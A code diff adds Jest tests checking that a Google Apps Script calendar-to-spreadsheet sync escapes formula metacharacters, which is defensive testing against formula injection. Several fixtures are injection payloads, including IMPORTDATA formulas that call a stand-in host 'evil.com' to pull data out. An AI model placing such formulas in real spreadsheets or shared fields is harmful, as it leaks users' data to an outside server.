@@ -553,6 +553,80 @@ describe('Checkpoint logic (GAS only)', () => {
     expect(row[5]).toBe(''); // location
     expect(row[6]).toBe(''); // attendees
   });
+
+  test('sanitizeValue prevents formula injection', () => {
+    const code = require('../code.gs');
+    
+    // Test all formula metacharacters
+    expect(code.sanitizeValue('=1+1')).toBe("'=1+1");
+    expect(code.sanitizeValue('+1+1')).toBe("'+1+1");
+    expect(code.sanitizeValue('-1+1')).toBe("'-1+1");
+    expect(code.sanitizeValue('@SUM(A1:A10)')).toBe("'@SUM(A1:A10)");
+    
+    // Test safe values
+    expect(code.sanitizeValue('Normal text')).toBe('Normal text');
+    expect(code.sanitizeValue('Meeting at 3pm')).toBe('Meeting at 3pm');
+    expect(code.sanitizeValue('')).toBe('');
+    
+    // Test non-string values
+    expect(code.sanitizeValue(null)).toBe(null);
+    expect(code.sanitizeValue(123)).toBe(123);
+    expect(code.sanitizeValue(undefined)).toBe(undefined);
+  });
+
+  test('eventToRowGAS sanitizes title, description, and location', () => {
+    const code = require('../code.gs');
+    
+    const evt = createCalendarEvent({
+      id: 'e_inject',
+      title: '=IMPORTDATA("http://evil.com/steal")',
+      start: new Date('2026-02-02T10:00:00Z'),
+      end: new Date('2026-02-02T11:00:00Z'),
+      description: '+SUM(A1:A100)',
+      location: '-1+1',
+      attendees: []
+    });
+    
+    const row = code.eventToRowGAS(evt);
+    
+    expect(row[1]).toBe("'=IMPORTDATA(\"http://evil.com/steal\")"); // title
+    expect(row[4]).toBe("'+SUM(A1:A100)"); // description
+    expect(row[5]).toBe("'-1+1"); // location
+  });
+
+  test('_syncCalendarToSheetGAS writes sanitized values to prevent formula injection', () => {
+    const code = require('../code.gs');
+    
+    global.SPREADSHEET_ID = 'ss1';
+    global.SHEET_NAME = 'Sheet1';
+    
+    const ss = SpreadsheetApp.openById('ss1');
+    const sheet = ss.getSheetByName('Sheet1');
+    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
+    
+    const calendar = CalendarApp.getDefaultCalendar();
+    const evt = createCalendarEvent({
+      id: 'e_safe',
+      title: '=MALICIOUS()',
+      start: new Date('2026-02-02T10:00:00Z'),
+      end: new Date('2026-02-02T11:00:00Z'),
+      description: '@IMPORTDATA("http://evil.com")',
+      location: '+DANGEROUS',
+      attendees: []
+    });
+    calendar.__addEvent(evt);
+
+    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
+    
+    const rows = sheet.__getRows();
+    expect(rows.length).toBe(1);
+    expect(rows[0][1]).toBe("'=MALICIOUS()"); // title sanitized
+    expect(rows[0][4]).toBe("'@IMPORTDATA(\"http://evil.com\")"); // description sanitized
+    expect(rows[0][5]).toBe("'+DANGEROUS"); // location sanitized
+    
+    delete global.SPREADSHEET_ID;
+    delete global.SHEET_NAME;
+  });
 });
 
 
